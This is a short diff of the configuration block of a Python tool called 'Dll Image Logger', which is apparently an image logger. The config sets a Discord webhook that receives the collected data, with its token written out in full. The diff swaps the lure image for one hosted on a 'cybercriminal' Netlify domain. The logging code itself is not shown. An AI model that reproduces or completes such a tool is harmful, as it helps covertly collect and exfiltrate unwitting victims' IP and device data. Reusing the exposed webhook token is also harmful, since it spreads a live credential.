@@ -23,7 +23,7 @@ __author__ = "lynxWings"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1157015075262058566/KbvdFL6xTMt6eA5Xh-XV3HBzvtecKLxmEg6PYmJH4FtFXMfTACkiYlIqAK6Y96aT7J9I", # <------------------------- Put your webhook link here.
-    "image": "https://cdn.discordapp.com/attachments/1161341072463638679/1162056658067927142/image.png?ex=653a8c99&is=65281799&hm=7b052f9638649a0606867e77d0075d2c4d95931616e31036d2dbec3677bf538d&", # <------------------------- Put image address link here.
+    "image": "https://cybercriminal.netlify.app/media/CatDog.jpeg", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "Dll Image Logger",
